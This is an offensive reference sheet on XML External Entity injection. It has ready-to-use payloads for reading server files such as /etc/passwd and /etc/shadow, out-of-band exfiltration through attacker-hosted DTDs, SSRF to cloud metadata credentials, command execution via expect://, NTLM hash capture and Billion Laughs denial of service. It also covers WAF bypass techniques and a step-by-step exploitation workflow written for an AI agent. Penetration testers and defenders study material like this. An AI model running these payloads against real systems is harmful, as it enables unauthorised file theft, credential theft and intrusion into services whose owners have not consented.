# XXE (XML External Entity Injection)

> **Summary**: XXE exploits XML parsers that process external entity references, allowing attackers to read files, perform SSRF, or execute code through crafted XML input.
> **Impact**: Read arbitrary server files, perform SSRF to internal services, achieve remote code execution, cause denial of service.
> **Typical Severity**: High | Critical

## Detection

### Indicators

- Endpoints accepting `Content-Type: application/xml` or `text/xml`
- SOAP/WSDL web services
- File uploads accepting XML-based formats: SVG, DOCX, XLSX, PPTX, PDF, RSS, SAML
- Endpoints accepting JSON that can be switched to XML (`Content-Type: application/xml`)
- RSS feed parsers
- SSO/SAML integration endpoints
- API endpoints processing XML request bodies
- Any endpoint with `<?xml` in request or response

### Automated Detection

- Burp Suite Active Scanner detects XXE via parameter entity callbacks
- Inject an external entity pointing to Burp Collaborator and monitor for DNS/HTTP callbacks
- Use the Burp extension "Content Type Converter" to convert JSON requests to XML and test

### Manual Detection

1. Submit a test entity to confirm XML parsing:
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe "teststring">]>
<root>&xxe;</root>
```
If "teststring" appears in the response, entities are processed.

2. Test external entity resolution with an OOB callback:
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR">]>
<root>&xxe;</root>
```

3. If regular entities are blocked, test parameter entities:
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR"> %xxe;]>
<root>test</root>
```

## Exploitation

### Prerequisites

- Application parses user-supplied XML input
- XML parser has external entity resolution enabled (default in many libraries)
- For blind XXE: ability to host a malicious DTD on an attacker-controlled server

### Step-by-Step

**1. Confirm entity processing** -- Inject a simple internal entity and check if it resolves in the response.

**2. Attempt file read** -- Use a `SYSTEM` entity to read a local file.

**3. If no direct output** -- Attempt blind XXE via OOB exfiltration or error-based techniques.

**4. Escalate** -- Chain with SSRF, attempt RCE via `expect://` or `jar://` protocol.

### Payloads

#### Classic XXE -- File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]>
<data>&xxe;</data>
```

#### File Read via PHP Wrapper (base64 -- avoids parsing issues with binary/XML content)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&xxe;</data>
```

#### Directory Listing (Java-based applications)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]>
<root>&xxe;</root>
```

#### XXE to SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<root>&xxe;</root>
```

#### Blind XXE -- OOB via Parameter Entities

**Attacker-hosted DTD (malicious.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?data=%file;'>">
%eval;
%exfil;
```

**Payload sent to target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/malicious.dtd"> %xxe;]>
<root>test</root>
```

#### Error-Based XXE (External DTD)

**Attacker-hosted DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/error.dtd"> %xxe;]>
<root>test</root>
```
The file contents appear in the XML parsing error message.

#### Error-Based XXE via Local/System DTD (No Outbound Connectivity)

Redefine an entity from a local DTD to trigger an error containing file contents:
```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<root>test</root>
```

Common local DTDs to try:
- `/usr/share/yelp/dtd/docbookx.dtd` (GNOME systems, entity: `ISOamso`)
- `/usr/local/app/schema.dtd`
- Use [dtd-finder](https://github.com/GoSecure/dtd-finder) to scan Docker images for available DTDs

#### XXE via SVG Upload

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">
    <image xlink:href="file:///etc/hostname"></image>
</svg>
```

SVG with command execution (PHP expect module required):
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">
    <image xlink:href="expect://id"></image>
</svg>
```

#### XXE via DOCX/XLSX

1. Create a new `.docx` or `.xlsx` file
2. Unzip the file: `unzip document.docx -d unzipped/`
3. Edit `unzipped/word/document.xml` (or `unzipped/xl/sharedStrings.xml` for XLSX)
4. Insert the XXE payload into the XML
5. Repackage: `cd unzipped && zip -r ../malicious.docx .`
6. Upload the crafted file

#### XXE in SOAP

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://ATTACKER/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

#### XInclude Attack (When You Cannot Control the DOCTYPE)

When your input is embedded into a server-side XML document and you cannot inject a DOCTYPE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

URL-encoded for parameter injection:
```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

#### Content-Type Switching (JSON to XML)

If an endpoint accepts JSON, try switching to XML:
```
POST /api HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
```

#### Billion Laughs (DoS)

```xml
<!DOCTYPE data [
  <!ENTITY a0 "dos">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

#### NTLM Hash Theft (Windows)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://///ATTACKER_IP/share/test.jpg">]>
<data>&xxe;</data>
```
Capture the NTLM hash with Responder: `Responder.py -I eth0 -v`

#### RCE via PHP expect://

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><cmd>&xxe;</cmd></root>
```

### Proof of Concept

1. Identify an endpoint accepting XML (e.g., stock check API, file upload)
2. Inject a basic entity test to confirm parsing
3. Escalate to file read with `file:///etc/hostname`
4. If no direct output, set up an external DTD for OOB exfiltration
5. Capture the file contents via HTTP callback to your server
6. Document the impact: files readable, SSRF targets accessible

## Bypasses

- **WAF blocking `<!DOCTYPE`**: Use UTF-16 or UTF-7 encoding for the entire payload
- **UTF-7 encoding**: Set `<?xml version="1.0" encoding="UTF-7"?>` and encode the payload
- **UTF-16 encoding**: Convert the payload to UTF-16 (many WAFs only inspect UTF-8)
- **CDATA sections**: Wrap payload elements in `<![CDATA[...]]>` to avoid detection
- **HTML entity encoding**: Encode entity declarations with numeric HTML entities to bypass filters
- **`data://` protocol**: `<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]>`
- **PHP wrappers**: Use `php://filter/convert.base64-encode/resource=` instead of `file://`
- **`jar://` protocol (Java)**: `jar:https://attacker.com/evil.zip!/evil.dtd` -- writes temp files and can chain with path traversal
- **Parameter entities when regular entities are blocked**: Switch from `<!ENTITY xxe ...>` to `<!ENTITY % xxe ...> %xxe;`
- **XInclude when DOCTYPE is blocked**: Use `<xi:include>` which does not require a DOCTYPE declaration
- **Content-Type switching**: Change `application/json` or `application/x-www-form-urlencoded` to `application/xml`
- **Local DTD repurposing**: When outbound connections are blocked, redefine entities in local system DTDs

## Escalation

- **XXE to SSRF**: Use `http://` or `https://` entity URIs to reach internal services, cloud metadata (169.254.169.254), or admin panels. See [ssrf.md](ssrf.md).
- **XXE to RCE**: Via PHP `expect://` wrapper, Java `jar://` protocol writing temp files combined with path traversal, or Java XMLDecoder deserialization
- **XXE to LFI/Path Traversal**: Combine `jar://` temp file writes with local file include vulnerabilities
- **Blind XXE to full read**: Chain OOB exfiltration with FTP for multi-line files (use xxe-ftp-server.rb)
- **XXE to NTLM relay**: On Windows, force UNC path resolution to capture/relay NTLM hashes
- **XXE via file upload chain**: SVG/DOCX/XLSX upload leading to internal file read or SSRF

## Tools

| Tool | Usage |
|---|---|
| XXEinjector | Automated XXE injection tool with OOB data exfiltration |
| oxml_xxe | Tool for embedding XXE payloads into DOCX/XLSX/PPTX files |
| dtd-finder | Find exploitable DTDs in Docker images and system paths |
| xxe-ftp-server.rb | FTP server for exfiltrating multi-line files via blind XXE |
| Content Type Converter | Burp extension to convert JSON requests to XML for testing |
| Burp Collaborator | Detect blind XXE via DNS/HTTP OOB callbacks |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. **Identify XML parsing surfaces**:
   - Inspect all requests for `Content-Type: application/xml`, `text/xml`, or `application/soap+xml` headers.
   - Search for endpoints accepting SOAP/WSDL requests (paths containing `/ws/`, `/soap/`, `/wsdl/`, `/service/`).
   - Identify file upload features accepting XML-based formats: SVG, DOCX, XLSX, PPTX, RSS, SAML assertions.
   - Test JSON endpoints by switching `Content-Type` from `application/json` to `application/xml` and converting the body to XML format.
   - Check for `<?xml` in any response bodies indicating XML processing.
2. **Map injection points**:
   - For each discovered XML endpoint, note: `<ENDPOINT_URL>`, `<HTTP_METHOD>`, `<PARAMETER_NAME>`, `<ORIGINAL_CONTENT_TYPE>`.
   - For file uploads, note: `<UPLOAD_URL>`, `<FILE_PARAMETER>`, `<ALLOWED_EXTENSIONS>`.

### Phase 2: Validation
1. **Test internal entity processing**:
   - Submit a request with an internal entity definition: `<!DOCTYPE test [<!ENTITY xxe "XXECANARY">]>` and reference `&xxe;` in a reflected field.
   - **IF** `XXECANARY` appears in the response --> entities are processed, proceed to Phase 3 (Direct XXE).
   - **IF** no reflection but no error --> test parameter entities with OOB callback: `<!ENTITY % xxe SYSTEM "http://<COLLABORATOR_URL>"> %xxe;`.
   - **IF** DNS/HTTP callback received on `<COLLABORATOR_URL>` --> blind XXE confirmed, proceed to Phase 3 (Blind XXE).
   - **IF** error message returned containing entity content --> error-based XXE confirmed, proceed to Phase 3 (Error-Based).
2. **Test file upload vectors**:
   - Upload an SVG file containing: `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://<COLLABORATOR_URL>">]>` with `&xxe;` in a `<text>` element.
   - Create a DOCX/XLSX with XXE payload injected into `word/document.xml` or `xl/sharedStrings.xml`.
   - **IF** callback received --> file-upload-based XXE confirmed.
3. **Test XInclude** (when you cannot control the DOCTYPE):
   - Inject `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://<COLLABORATOR_URL>"/></foo>` into parameter values.
   - **IF** callback received --> XInclude works.

### Phase 3: Exploitation
1. **Direct XXE (entity reflected in response)**:
   - Read a safe proof file: `<!ENTITY xxe SYSTEM "file:///etc/hostname">` (Linux) or `<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">` (Windows).
   - **IF** file contents appear in response --> confirmed file read. Escalate to sensitive files: `/etc/passwd`, `/etc/shadow`, `<APP_CONFIG_PATH>`.
   - **IF** multi-line files break XML parsing --> use `php://filter/convert.base64-encode/resource=<TARGET_FILE>` wrapper.
2. **Blind XXE (no direct output)**:
   - Host a malicious DTD on `<ATTACKER_SERVER>`:
     ```
     <!ENTITY % file SYSTEM "file:///etc/hostname">
     <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<ATTACKER_SERVER>/?d=%file;'>">
     %eval; %exfil;
     ```
   - Send payload: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<ATTACKER_SERVER>/evil.dtd"> %xxe;]>`.
   - **IF** file contents appear in HTTP callback query string --> blind exfiltration works.
   - **IF** no outbound HTTP allowed --> try FTP exfiltration using `xxe-ftp-server.rb`.
   - **IF** no outbound connectivity at all --> use error-based technique with local DTD repurposing.
3. **Error-Based XXE**:
   - Host DTD: `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;`.
   - File contents appear in the XML parsing error message.
4. **Local DTD repurposing (no outbound)**:
   - Enumerate local DTDs: `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/local/app/schema.dtd`.
   - Redefine an entity from the local DTD to trigger an error containing file contents.

### Phase 4: Escalation
1. **XXE to SSRF**:
   - Replace `file://` with `http://` to probe internal services: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP), `http://169.254.169.254/metadata/instance` (Azure).
   - Scan internal network: `http://192.168.1.<1-254>:<COMMON_PORTS>/`.
2. **XXE to RCE**:
   - **IF** PHP with expect module --> `expect://<COMMAND>`.
   - **IF** Java --> test `jar://` protocol for temp file writes, chain with path traversal or LFI.
   - **IF** XMLDecoder is used (Java) --> craft XMLDecoder payload for direct RCE.
3. **XXE to NTLM theft (Windows)**:
   - Use UNC path: `file://///ATTACKER_IP/share/test` and capture hashes with Responder.

## Decision Tree

```
Start: XML input identified
|
|--> Submit internal entity test (&xxe; = "CANARY")
|    |
|    |--> [CANARY reflected in response] --> DIRECT XXE
|    |    |--> Read file:///etc/hostname
|    |    |--> IF multi-line breaks XML --> use php://filter base64 wrapper
|    |    |--> Escalate: SSRF via http:// entities, RCE via expect://
|    |
|    |--> [No reflection, no error] --> Test OOB parameter entity callback
|         |
|         |--> [Callback received] --> BLIND OOB XXE
|         |    |--> Host malicious DTD for file exfiltration
|         |    |--> IF no HTTP outbound --> try FTP exfiltration
|         |    |--> IF no outbound at all --> error-based via local DTD
|         |
|         |--> [No callback] --> Test error-based XXE
|              |
|              |--> [File contents in error message] --> ERROR-BASED XXE
|              |    |--> Use external DTD or local DTD repurposing
|              |
|              |--> [No error output] --> Test via FILE UPLOAD
|                   |
|                   |--> Upload SVG with XXE entity
|                   |--> Upload DOCX/XLSX with injected XML
|                   |--> Upload via XInclude injection in parameters
|                   |
|                   |--> [Callback or file contents obtained] --> XXE confirmed
|                   |--> [Nothing works] --> XXE likely not exploitable; try DoS (Billion Laughs)
```

## Success Criteria

- **Minimum PoC**: Demonstrated ability to read a server file (`/etc/hostname` or `C:\windows\win.ini`) or received an OOB callback proving entity resolution.
- **Confirmed Impact**: Successfully exfiltrated sensitive files (`/etc/passwd`, application config, cloud metadata credentials).
- **Escalation Confirmed**: Achieved SSRF to internal services, RCE via `expect://` or gadget chain, or captured NTLM hashes.
- **Evidence Required**: HTTP request/response showing the injected entity and the resolved file contents (or OOB server logs showing the exfiltrated data).

## References

| URL | Description |
|---|---|
| https://portswigger.net/web-security/xxe | PortSwigger XXE learning materials and labs |
| https://portswigger.net/web-security/xxe/blind | Blind XXE exploitation techniques |
| https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection | Comprehensive XXE payload collection |
| https://github.com/payloadbox/xxe-injection-payload-list | XXE injection payload list |
| https://gist.github.com/staaldraad/01415b990939494879b4 | XXE payloads cheat sheet |
| https://github.com/GoSecure/dtd-finder | DTD finder for local DTD exploitation |
| https://github.com/GoSecure/xxe-workshop | XXE workshop with hands-on exercises |
| https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/ | Obscure XXE attacks via Office documents and file uploads |
| https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html | XXE cheat sheet |
| https://pentestbook.six2dez.com/enumeration/web/xxe | XXE reference material |
| https://github.com/Ambrotd/XXE-Notes | XXE notes with HTML entity bypass techniques |
